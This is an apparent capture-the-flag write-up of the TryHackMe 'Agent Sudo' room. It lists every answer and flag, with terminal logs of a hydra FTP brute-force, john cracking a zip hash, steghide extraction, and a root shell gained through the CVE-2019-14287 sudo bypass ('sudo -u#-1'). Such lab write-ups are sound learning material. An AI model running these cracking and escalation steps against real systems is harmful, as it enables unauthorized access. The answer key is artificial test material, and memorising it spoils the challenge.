# Agent Sudo 

## Task 1  Author note
+ Deploy the machine `No Answer Needed`
## Task 2  Enumerate
+ How many open ports?`3`
+ How you redirect yourself to a secret page?`User-Agent`
+ What is the agent name?`chris`
## Task 3  Hash cracking and brute-force
+ FTP password`crystal`
+ Zip file password`alien`
+ steg password`Area51`
+ Who is the other agent (in full name)?`james`
+ SSH password`hackerrules!`

```bash
hengkisirait: AgentSudo $ hydra -l chris -P ~/HackTools/rockyou.txt 10.10.95.209 ftp
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-01 11:41:41
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.95.209:21/
[STATUS] 240.00 tries/min, 240 tries in 00:01h, 14344159 to do in 996:08h, 16 active
[21][ftp] host: 10.10.95.209   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-01 11:42:48

hengkisirait: AgentSudo $ ftp 10.10.95.209
Connected to 10.10.95.209.
220 (vsFTPd 3.0.3)
Name (10.10.95.209:hengkisirait): chris
331 Please specify the password.
Password:
230 Login successful.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp>

┌──(lodwig㉿kali)-[~/AgentSudo/_cutie.png.extracted]
└─$ cat hash_zip
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:8702.zip

┌──(lodwig㉿kali)-[~/AgentSudo/_cutie.png.extracted]
└─$ john hash_zip -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:01 DONE (2024-03-01 12:10) 0.5347g/s 13142p/s 13142c/s 13142C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(lodwig㉿kali)-[~/AgentSudo/_cutie.png.extracted]
└─$ echo QXJlYTUx | base64 -d
Area51

┌──(lodwig㉿kali)-[~/AgentSudo]
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".

┌──(lodwig㉿kali)-[~/AgentSudo]
└─$ ls
_cutie.png.extracted  cute-alien.jpg  cutie.png  message.txt

┌──(lodwig㉿kali)-[~/AgentSudo]
└─$ cat message.txt
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

## Task 4  Capture the user flag
+ What is the user flag?`b03d975e8c92a7c04146cfa7a5a313c7`
+ What is the incident of the photo called?`Roswell alient autopsy`
```bash
┌──(lodwig㉿kali)-[~/AgentSudo]
└─$ ssh james@10.10.95.209
The authenticity of host '10.10.95.209 (10.10.95.209)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.95.209' (ED25519) to the list of known hosts.
james@10.10.95.209's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Mar  1 05:17:42 UTC 2024

  System load:  0.0               Processes:           98
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.95.209
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

## Task 5  Privilege escalation
+ (Format: CVE-xxxx-xxxx)`CVE-2019-14287`
+ What is the root flag?`b53a02f55b57d4439e3341834d70c062`
+ (Bonus) Who is Agent R?`DesKel`

```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root

root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls -la
total 32
drwx------  4 root root 4096 Oct 29  2019 .
drwxr-xr-x 24 root root 4096 Oct 29  2019 ..
-rw-------  1 root root 1952 Oct 29  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Oct 29  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Oct 29  2019 .ssh
-rw-r--r--  1 root root  197 Oct 29  2019 root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
root@agent-sudo:/root#
```
